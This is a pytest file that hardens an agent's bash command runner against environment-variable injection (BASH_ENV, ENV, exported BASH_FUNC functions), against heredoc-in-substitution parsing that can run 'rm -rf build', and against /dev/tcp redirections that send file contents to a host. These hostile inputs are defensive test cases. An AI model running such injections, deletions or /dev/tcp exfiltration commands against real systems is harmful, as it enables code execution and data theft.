"""S2a-3 a (the user's decision, 2026-10-22): commands run in /bin/bash, and nothing outside the command's text
changes how it is read.

Two walls, each tested on its own: child_environment is an allowlist, so BASH_ENV, ENV and exported functions
(BASH_FUNC_*) never reach a command; and bash runs in privileged mode (-p), which ignores all three even if one
got through. The direct test runs bash with and without -p, so it can tell the two apart."""
from __future__ import annotations

import subprocess

import pytest

from server.orchestrator import tool_loop
from server.services import terminal_exec, terminal_policy as tp

BASH = terminal_exec.SHELL[0]


def _hostile_env(tmp_path) -> dict:
    startup = tmp_path / "startup.sh"
    startup.write_text(f"touch {tmp_path / 'sourced'}\n")
    return {"BASH_ENV": str(startup), "ENV": str(startup),
            # the exported-function format bash 3.2.57 (macOS) and current bash both import
            "BASH_FUNC_imported%%": "() { echo imported; }"}


def _run(argv, env, cwd):
    return subprocess.run(argv, env={"PATH": "/usr/bin:/bin", **env}, cwd=cwd, capture_output=True, text=True,
                          timeout=10)


def test_privileged_mode_ignores_startup_files_and_exported_functions(tmp_path):
    env = _hostile_env(tmp_path)
    plain = _run([BASH, "-c", "imported"], env, tmp_path)
    assert (tmp_path / "sourced").exists() and "imported" in plain.stdout     # the attack works without -p …
    (tmp_path / "sourced").unlink()
    guarded = _run([*terminal_exec.SHELL, "-c", "imported"], env, tmp_path)
    assert not (tmp_path / "sourced").exists()                                # … and -p stops all of it
    assert "imported" not in guarded.stdout and guarded.returncode != 0


async def test_a_command_never_sees_them(monkeypatch, tmp_path):
    for key, value in _hostile_env(tmp_path).items():
        monkeypatch.setenv(key, value)
    # bash reads ~/.bashrc when it thinks ssh started it, -p or not, so only the allowlist holds this one
    monkeypatch.setenv("SSH_CLIENT", "10.0.0.1 22 22")
    out = await terminal_exec.run('printf "%s|%s|%s|" "${BASH_ENV-unset}" "${ENV-unset}" "${SSH_CLIENT-unset}"; '
                                  'type imported || true', cwd=tmp_path)
    assert out["stdout"].startswith("unset|unset|unset|")
    assert "imported is a function" not in out["stdout"]
    assert not (tmp_path / "sourced").exists()


async def test_the_user_s_zshenv_is_not_read(monkeypatch, tmp_path):
    """zsh -c read ~/.zshenv before every command; bash -p -c reads no startup file, ~/.bashrc under ssh included."""
    home = tmp_path / "home"
    home.mkdir()
    (home / ".zshenv").write_text(f"touch {tmp_path / 'zshenv-read'}\n")
    (home / ".bashrc").write_text(f"touch {tmp_path / 'bashrc-read'}\n")
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("SSH_CLIENT", "10.0.0.1 22 22")
    out = await terminal_exec.run("echo ok", cwd=tmp_path)
    assert out["ok"] and out["stdout"].strip() == "ok"
    assert not (tmp_path / "zshenv-read").exists() and not (tmp_path / "bashrc-read").exists()


# ── a here-document inside a substitution ───────────────────────────────

# bash 3.2's scan of a substitution doesn't know here-documents, so some text in one ends it early and the rest runs
# (#723 review): a numbered list in a commit message can delete a folder. zsh read such a body as data.
INSIDE = [
    "NOTE=$(cat <<'EOF'\nSteps\n1) rm -rf build\nEOF\n)\necho \"$NOTE\" > n.txt",
    "git commit -m \"$(cat <<'EOF'\nFix:\n1) foo\n2) bar\nEOF\n)\"",
    "printf '[%s]\\n' \"$(cat <<EOF\nx\nEOF\n)\"",
    "x=$(cat <<-EOF\n\tx\n\tEOF\n)",
    "x=$(cat << \"EOF\"\nit's\nEOF\n)",
    "diff <(cat <<E\nx\nE\n) f",
    "tee >(cat <<E\nx\nE\n)",
]


@pytest.mark.parametrize("command", INSIDE)
def test_a_here_document_inside_a_substitution_is_that_shape(command):
    assert tp.heredoc_in_substitution(command), command


@pytest.mark.parametrize("command", [
    "cat <<'EOF'\n$(date)\nEOF", "python3 - <<'PY'\nprint(1)\nPY", "x=$(( 1 << 2 ))", "cat <<< \"$(date)\"",
    "x=$(cat <<<hi)", "echo \"$(date) << x\"", "(cat <<E\nx\nE\n)", "x=`cat <<E\nx\nE\n`", "{ cat <<E\nx\nE\n}",
    "git commit -F msg.txt", "x=$(date)",
])
def test_the_shapes_bash_reads_correctly_are_not(command):
    assert not tp.heredoc_in_substitution(command), command


@pytest.mark.parametrize("command", INSIDE[:2])
async def test_that_shape_is_refused_before_it_runs_and_says_what_to_do(monkeypatch, command):
    ran = []

    class Never:
        key = "run_command"

        async def execute(self, args):
            ran.append(args)
            return {"ok": True}

    async def no_card(*a, **kw):
        raise AssertionError("no card is shown")

    async def resolve():
        return [{"key": "run_command", "description": "run"}]
    monkeypatch.setitem(tool_loop.EXECUTORS, "run_command", Never())
    r = await tool_loop._dispatch_tool("run_command", {"command": command}, "{}", resolve_tools=resolve,
                                       emit=lambda e: None, tool_timeout_s=5, tool_trace=[], convo=[],
                                       confirm_command=no_card, conversation_id="c1")
    assert ran == [] and r["ok"] is False
    assert "write_file" in r["note"] and "git commit -F" in r["note"]


# ── what bash can do that zsh couldn't ──────────────────────────────────

@pytest.mark.parametrize("command", ["cat f > /dev/tcp/127.0.0.1/80", "exec 3<>/dev/tcp/example.test/80",
                                     "cat </dev/udp/127.0.0.1/53", "echo x >>/dev/tcp/h/1"])
def test_a_redirection_that_opens_a_connection_asks(command):
    assert (tp.assess(command).level, tp.assess(command).rule) == ("ask", "remote-shell"), command


@pytest.mark.parametrize("command", ["ls /dev/tcp", "echo /dev/tcp/h/1"])
def test_naming_that_path_doesnt(command):
    assert tp.assess(command).rule != "remote-shell", command
